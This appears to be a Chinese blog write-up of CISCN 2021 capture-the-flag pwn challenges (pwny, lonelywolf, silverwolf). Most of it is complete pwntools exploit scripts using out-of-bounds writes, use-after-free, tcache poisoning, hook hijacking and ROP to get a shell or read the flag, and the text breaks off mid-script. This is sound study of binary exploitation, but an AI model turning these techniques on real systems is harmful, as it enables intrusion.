<p>进入write函数，这里数组存在越界，可以通过这里修改两次，把之前那个变量修改为0。这里是这么理解的：第一次修改，是把随机数里面的一个数据替换文字描述符，然后在来一次，由于这个随机数不会对应一个打开的文件，所以read不执行，v2仍然是0，就成功修改了。因为这题开启了PIE加上本就有的ASLR，我们要泄露的地址有两个，一个是PIE，另一个是libc</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523181332.png"></p>
<p>在read功能里面有个__print_chk，在汇编代码可以看见，第三个参数是可以被栈顶的内容影响，而这是我们可以输入的，所以继续数组越界</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523181504.png"></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/QQ%E5%9B%BE%E7%89%8720210523181627.png"></p>
<p>分别泄露出.bss段上的stdrr,以及data里面存在一个该地址的偏移，可以看出来方向是对了，主题人给的条件。</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/1.png"></p>
<p>这是计算泄露出的地址距离libc_base的偏移</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/3.png"></p>
<p>最后劫持exit_hook为system，并且找到exit对应的参数位置，将其修改为”/bin/sh\x00”。大佬的思维是真滴强！膜拜！</p>
<p>exp1：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br>libc =ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_s</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.sendline(<span class="hljs-built_in">str</span>(idx))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read_s</span>(<span class="hljs-params">idx</span>):</span><br>	p.recvuntil(<span class="hljs-string">&quot;Your choice:&quot;</span>)<br>	p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>	p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>	p.send(p64(idx))<br>write_s(<span class="hljs-number">0x100</span>)<br>write_s(<span class="hljs-number">0x100</span>)<br>read_s(<span class="hljs-number">0xFFFFFFFFFFFFFFFC</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>libc.address = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) -<span class="hljs-number">0x3ec680</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(libc.address)<br>read_s(<span class="hljs-number">0xFFFFFFFFFFFFFFF5</span>)<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>pie = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)+<span class="hljs-number">0x58</span><br><span class="hljs-built_in">print</span> <span class="hljs-built_in">hex</span>(pie)<br>write_s((libc.address+<span class="hljs-number">0x61b968</span> - pie)/<span class="hljs-number">8</span>)<br>p.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>gdb.attach(p)<br>write_s((libc.address+<span class="hljs-number">0x61bf60</span> - pie)/<span class="hljs-number">8</span>)<br>p.sendline(p64(libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]))<br><br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<p>第二种做法涉及到一个知识点，scanf函数在遇到过长输入时会申请堆。前面在泄漏PIE和libc是一致的，getshell时，让数组越界访问到__malloc_hook那边去，写入one_gadget</p>
<p>exp2:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=process(<span class="hljs-string">&#x27;./1&#x27;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_con</span>(<span class="hljs-params">idx, con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.send(con)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.send(con)<br><br><span class="hljs-comment"># fd --&gt; 0</span><br>write(<span class="hljs-number">256</span>)<br>write(<span class="hljs-number">256</span>)<br><br><span class="hljs-comment"># leak libc</span><br>read(p64(<span class="hljs-number">0xfffffffffffffffc</span>))  <span class="hljs-comment"># bss --&gt; stderr</span><br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>)<br>libc_info = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stderr: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_info))<br><br><span class="hljs-comment"># leak code addr</span><br>read(p64(<span class="hljs-number">0xfffffffffffffff5</span>))  <span class="hljs-comment"># data --&gt; off_202008</span><br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>code_base = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)-<span class="hljs-number">0x202008</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;code base: &quot;</span>, <span class="hljs-built_in">hex</span>(code_base))<br><br><br>libc = ELF(<span class="hljs-string">&quot;./libc-2.27.so&quot;</span>)<br>base = libc_info-libc.sym[<span class="hljs-string">&quot;_IO_2_1_stderr_&quot;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;libc base: &quot;</span>, <span class="hljs-built_in">hex</span>(base)<br>m_hook = base+libc.sym[<span class="hljs-string">&quot;__malloc_hook&quot;</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&quot;m_hook: &quot;</span>, <span class="hljs-built_in">hex</span>(m_hook)<br>realloc = base+libc.sym[<span class="hljs-string">&quot;realloc&quot;</span>]<br><span class="hljs-built_in">print</span><span class="hljs-string">&quot;realloc: &quot;</span>, <span class="hljs-built_in">hex</span>(realloc)<br>oneshot = [<span class="hljs-number">0x4f3d5</span>, <span class="hljs-number">0x4f432</span>, <span class="hljs-number">0x10a41c</span>]<br>oneshot = base+oneshot[<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span><span class="hljs-string">&quot;oneshot: &quot;</span>, <span class="hljs-built_in">hex</span>(oneshot)<br><br>offset = (m_hook-code_base-<span class="hljs-number">0x202060</span>)/<span class="hljs-number">8</span><br><span class="hljs-built_in">print</span><span class="hljs-string">&quot;offset: &quot;</span>, offset<br>write_con(<span class="hljs-built_in">int</span>(offset), p64(realloc+<span class="hljs-number">9</span>))<br>gdb.attach(p)<br>write_con(<span class="hljs-built_in">int</span>(offset-<span class="hljs-number">1</span>), p64(oneshot))<br>p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>, <span class="hljs-string">b&quot;1&quot;</span>*<span class="hljs-number">0x400</span>)   <span class="hljs-comment"># scanf</span><br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>

<p>第三种在栈上进行跳转，这里就不修改和解释了，一个大佬直接复制过来的，就纯粹记录知识点：libc中environ存储了栈上环境变量</p>
<p>exp3：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>ld_path = <span class="hljs-string">&quot;/home/fanxinli/ctf_go/glibc-2.27-64/lib/ld-2.27.so&quot;</span><br><span class="hljs-comment"># libc_path = &quot;/home/fanxinli/ctf_go/pwn/ciscn/pwny/libc-2.27.so&quot;</span><br><span class="hljs-comment">#   p = remote(&quot;124.71.230.113&quot;, 24425)</span><br>p = process([ld_path, <span class="hljs-string">&quot;./pwny&quot;</span>])<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write</span>(<span class="hljs-params">idx</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">write_con</span>(<span class="hljs-params">idx, con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.sendline(<span class="hljs-built_in">str</span>(idx))<br>    p.send(con)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">read</span>(<span class="hljs-params">con</span>):</span><br>    p.recvuntil(<span class="hljs-string">&quot;Your choice: &quot;</span>)<br>    p.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>    p.recvuntil(<span class="hljs-string">&quot;Index: &quot;</span>)<br>    p.send(con)<br><br><span class="hljs-comment"># fd --&gt; 0</span><br>write(<span class="hljs-number">256</span>)<br>write(<span class="hljs-number">256</span>)<br><br><span class="hljs-comment"># leak libc</span><br>read(p64(<span class="hljs-number">0xfffffffffffffffc</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>libc_info = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;stderr: &quot;</span>, <span class="hljs-built_in">hex</span>(libc_info))<br><br><span class="hljs-comment"># leak code addr</span><br>read(p64(<span class="hljs-number">0xfffffffffffffff5</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>code_base = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)-<span class="hljs-number">0x202008</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;code base: &quot;</span>, <span class="hljs-built_in">hex</span>(code_base))<br><br><span class="hljs-comment"># count</span><br><span class="hljs-comment"># libc = ELF(&quot;./libc-2.27.so&quot;)</span><br>libc = ELF(<span class="hljs-string">&quot;/home/fanxinli/ctf_go/glibc-2.27-64/lib/libc-2.27.so&quot;</span>)<br>base = libc_info-libc.sym[<span class="hljs-string">&quot;_IO_2_1_stderr_&quot;</span>]<br>environ = base+libc.sym[<span class="hljs-string">&quot;environ&quot;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;environ: &quot;</span>, <span class="hljs-built_in">hex</span>(environ))<br>oneshot = [<span class="hljs-number">0x415b6</span>, <span class="hljs-number">0x4160a</span>, <span class="hljs-number">0xdfae1</span>]<br>oneshot = base+oneshot[<span class="hljs-number">0</span>]<br><br><span class="hljs-comment"># leak stack addr</span><br>offset = <span class="hljs-built_in">int</span>((environ-code_base-<span class="hljs-number">0x202060</span>)/<span class="hljs-number">8</span>)<br>read(p64(offset &amp; <span class="hljs-number">0xffffffffffffffff</span>))<br>p.recvuntil(<span class="hljs-string">&quot;Result: &quot;</span>)<br>info = p.recvuntil(<span class="hljs-string">&quot;\n&quot;</span>, drop=<span class="hljs-literal">True</span>)<br>write_ret = <span class="hljs-built_in">int</span>(info, <span class="hljs-number">16</span>)-<span class="hljs-number">0x118</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;write_ret: &quot;</span>, <span class="hljs-built_in">hex</span>(write_ret))<br><br><span class="hljs-comment"># attack</span><br>offset = <span class="hljs-built_in">int</span>((write_ret-code_base-<span class="hljs-number">0x202060</span>)/<span class="hljs-number">8</span>)<br>write_con(offset, p64(oneshot))<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h3 id="二、lonelywolf"><a href="#二、lonelywolf" class="headerlink" title="二、lonelywolf"></a>二、lonelywolf</h3><p>程序存在UAF，double free把堆块申请到tcache 上，将之释放得到libc，然后分配到malloc_hook上执行one_gadget即可，注意的是double free时，要free一次后往里面写数据覆盖key，绕过检查，才能二次free</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python</span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>,log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#p=remote(&#x27;124.70.0.162&#x27;,26313)</span><br>p=process(<span class="hljs-string">&#x27;./2&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./2&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.27.so&#x27;</span>)<br>__malloc_hook=libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">allocate</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><br><br>allocate(<span class="hljs-number">0x60</span>)<br>delete()<br>edit(p64(<span class="hljs-number">0</span>))<br>delete()<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>heap=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>))<br>log.info(<span class="hljs-string">&quot;heap addr:&quot;</span> + <span class="hljs-built_in">hex</span>(heap))<br>edit(p64(heap - <span class="hljs-number">0x250</span>))<br>allocate(<span class="hljs-number">0x60</span>)<br>allocate(<span class="hljs-number">0x60</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>):<br>	edit(p64(<span class="hljs-number">0</span>))<br>	delete()<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>one_gadget = libc_base + <span class="hljs-number">0x10a41c</span>      <span class="hljs-comment">#0x4f3d5, 0x4f432, 0x10a41c</span><br>__malloc_hook = libc_base + __malloc_hook<br>log.info(<span class="hljs-string">&quot;libc base:0x%x&quot;</span> %libc_base)<br>log.info(<span class="hljs-string">&quot;__malloc_hook:0x%x&quot;</span> %__malloc_hook)<br>log.info(<span class="hljs-string">&quot;one_gadget:0x%x&quot;</span> %one_gadget)<br>allocate(<span class="hljs-number">0x50</span>)<br>edit(p64(<span class="hljs-number">0</span>))<br>allocate(<span class="hljs-number">0x10</span>)<br>edit(p64(__malloc_hook))<br>delete()<br>edit(p64(__malloc_hook))<br>allocate(<span class="hljs-number">0x10</span>)<br>allocate(<span class="hljs-number">0x10</span>)<br>edit(p64(one_gadget))<br>gdb.attach(p,<span class="hljs-string">&quot;b*main&quot;</span>)<br>allocate(<span class="hljs-number">0x20</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="silverwolf"><a href="#silverwolf" class="headerlink" title="silverwolf"></a>silverwolf</h2><p>时隔几月，总算是有能力来复现了，真不容易，不忘初心，砥砺前行！</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925084726694.png"><span class="image-caption">image-20210925084726694</span></p>
<p>常规checksec，64位保护全开</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925084839791.png"><span class="image-caption">image-20210925084839791</span></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925084858088.png"><span class="image-caption">image-20210925084858088</span></p>
<p>程序一开始就初始化了沙箱，看来是道orw的题了</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925085147596.png"><span class="image-caption">image-20210925085147596</span></p>
<p>add功能里面，只能申请小等于0x78的堆块，然后堆块结构体只存放一个堆块，也就是我们后续操作只能对着当前堆块进行</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925085714119.png"><span class="image-caption">image-20210925085714119</span></p>
<p>delete功能存在UAF漏洞</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925085753680.png"><span class="image-caption">image-20210925085753680</span></p>
<p>show功能打印堆块内容</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925090452594.png"><span class="image-caption">image-20210925090452594</span></p>
<p>edit功能往堆块里面写内容</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925091304553.png"><span class="image-caption">image-20210925091304553</span></p>
<p>由于开启沙箱，堆块存在十分多，把存放有堆地址的堆块申请出来，泄露堆地址</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925094259648.png"><span class="image-caption">image-20210925094259648</span></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925094827325.png"><span class="image-caption">image-20210925094827325</span></p>
<p>通过得到的堆地址，以及UAF把堆块申请到tcache上去，然后修改tcache entries，破坏结构，然后释放tcache，得到libc</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x60</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x10d0</span><br>log.info(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br>free()<br>edit(p64(heap_addr + <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x0002020200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br>edit(payload)<br>free()<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3EBCA0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>mprotect = libc_base + libc.sym[<span class="hljs-string">&#x27;mprotect&#x27;</span>]<br></code></pre></td></tr></table></figure>

<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925102647508.png"><span class="image-caption">image-20210925102647508</span></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925163718481.png"><span class="image-caption">image-20210925163718481</span></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925163939660.png"><span class="image-caption">image-20210925163939660</span></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925164137807.png"><span class="image-caption">image-20210925164137807</span></p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925165150750.png"><span class="image-caption">image-20210925165150750</span></p>
<p>由于前面产生libc地址破坏了堆块，所以要再重新修复一下，并且还要继续利用，所以在修复的同时也要再次覆盖chunk在上面，因为我们的申请的堆块大小有限制，所以要从把堆块劫持到0x20开始（前0x40是count），然后这边生成出的堆块是0x40，刚好，如果是从0x20开始，一直到0x80都是我们能申请的大小，而这跨度刚好是0x38，十分巧妙！膜拜大佬！</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925104646878.png"><span class="image-caption">image-20210925104646878</span></p>
<p>然后就是往那个堆块填充我们需要分配堆块的地址，就可以一块块的分配出去，完成free_hook写setcontext，设置’./flag\x00’地址，gadget所需寄存器的值设置以及rop填充地址，等等</p>
<p><img src="/2021/05/23/2021-05-23-CISCN(%E5%88%9D%E8%B5%9B)-pwn/image-20210925174414433.png"><span class="image-caption">image-20210925174414433</span></p>
<p>这里说一下，要用系统调用来调用open函数，否则会在运行到open函数直接报错退出，具体不懂，我跟踪到open函数发现fd分配到的数值很大，rdi什么的也是不对劲，具体原因不明白，然后就是，后面虽然一个堆块放不下rop，但是，分配出去的堆块我惊讶的发现是没有堆头的，所以rop仍然是连贯的</p>
<p>总的来说，还是完成了！</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./1&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc-2.27.so&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>	gdb.attach(p,<span class="hljs-string">&quot;b *main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Size: &quot;</span>,<span class="hljs-built_in">str</span>(size))<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">content</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>,content)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>():</span><br>	p.sendlineafter(<span class="hljs-string">&quot;choice: &quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-string">&#x27;0&#x27;</span>)<br><br>add(<span class="hljs-number">0x60</span>)<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>heap_addr = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x10d0</span><br>log.info(<span class="hljs-string">&quot;heap_addr==&gt;0x%x&quot;</span> %heap_addr)<br>free()<br>edit(p64(heap_addr + <span class="hljs-number">0x10</span>))<br>add(<span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x0002020200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br>edit(payload)<br>free()<br>show()<br>p.recvuntil(<span class="hljs-string">&quot;Content: &quot;</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3EBCA0</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br><br>setcontext = libc_base + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">53</span><br>free_hook = libc_base + libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>pop_rdi = <span class="hljs-number">0x00000000000215bf</span> + libc_base<br>pop_rsi = <span class="hljs-number">0x0000000000023eea</span> + libc_base<br>pop_rdx = <span class="hljs-number">0x0000000000001b96</span> + libc_base<br>pop_rax = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&#x27;pop rax\nret&#x27;</span>))) + libc_base<br>ret = <span class="hljs-number">0x00000000000008aa</span> + libc_base<br>syscall = <span class="hljs-built_in">next</span>(libc.search(asm(<span class="hljs-string">&quot;syscall\nret&quot;</span>))) + libc_base<br>read = libc_base + libc.sym[<span class="hljs-string">&quot;read&quot;</span>]<br>write = libc_base + libc.sym[<span class="hljs-string">&quot;write&quot;</span>]<br><span class="hljs-comment">#open = libc_base + libc.sym[&quot;open&quot;]</span><br>rop_addr = heap_addr+<span class="hljs-number">0x1000</span><br>flag_addr = heap_addr+<span class="hljs-number">0x2000</span><br><br>rop = p64(pop_rdi) + p64(flag_addr) + p64(pop_rsi) + p64(<span class="hljs-number">0</span>) + p64(pop_rax) + p64(<span class="hljs-number">2</span>) + p64(syscall)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">3</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + p64(read)<br>rop += p64(pop_rdi) + p64(<span class="hljs-number">1</span>) + p64(pop_rsi) + p64(flag_addr) + p64(pop_rdx)+ p64(<span class="hljs-number">0x50</span>) + 